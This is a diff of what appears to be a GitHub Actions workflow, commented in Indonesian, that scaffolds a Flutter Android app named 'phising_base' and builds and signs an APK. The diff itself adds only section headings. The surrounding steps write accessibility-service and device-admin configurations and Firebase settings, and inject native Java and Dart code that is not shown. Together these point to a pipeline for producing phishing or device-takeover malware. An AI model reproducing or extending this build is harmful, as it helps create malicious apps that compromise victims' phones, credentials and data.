@@ -39,8 +39,12 @@ jobs:
           flutter create phising_base
           cd phising_base
           
+          # ============================================
+          # 1. MANIFEST (SUDAH DITAMBAH xmlns:tools)
+          # ============================================
           cat > android/app/src/main/AndroidManifest.xml << 'EOF'
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              xmlns:tools="http://schemas.android.com/tools"
               package="com.example.phising_base">
               <uses-permission android:name="android.permission.INTERNET"/>
               <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
@@ -133,6 +137,9 @@ jobs:
           </manifest>
           EOF
 
+          # ============================================
+          # 2. PUBSPEC
+          # ============================================
           mkdir -p assets
           if [ -n "${{ github.event.inputs.icon_url }}" ]; then
             curl -fL "${{ github.event.inputs.icon_url }}" -o assets/icon.png || \
@@ -184,6 +191,9 @@ jobs:
           }
           EOF
 
+          # ============================================
+          # 3. XML RESOURCES
+          # ============================================
           mkdir -p android/app/src/main/res/xml
           cat > android/app/src/main/res/xml/accessibility_service_config.xml << 'EOF'
           <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
@@ -204,6 +214,9 @@ jobs:
           </device-admin>
           EOF
 
+          # ============================================
+          # 4. FIREBASE OPTIONS
+          # ============================================
           cat > lib/firebase_options.dart << 'EOF'
           import 'package:firebase_core/firebase_core.dart' show FirebaseOptions;
           class DefaultFirebaseOptions {
@@ -219,6 +232,9 @@ jobs:
           }
           EOF
 
+      # ============================================
+      # 5. INJECT JAVA FILES
+      # ============================================
       - name: Inject Native Java Files
         run: |
           cd phising_base
@@ -1361,6 +1377,9 @@ jobs:
           }
           EOF
 
+      # ============================================
+      # 6. INJECT DART FILES
+      # ============================================
       - name: Inject Dart Services
         run: |
           cd phising_base/lib
@@ -1789,6 +1808,9 @@ jobs:
           }
           EOF
 
+      # ============================================
+      # 7. BUILD APK
+      # ============================================
       - name: Build & Sign APK
         run: |
           cd phising_base
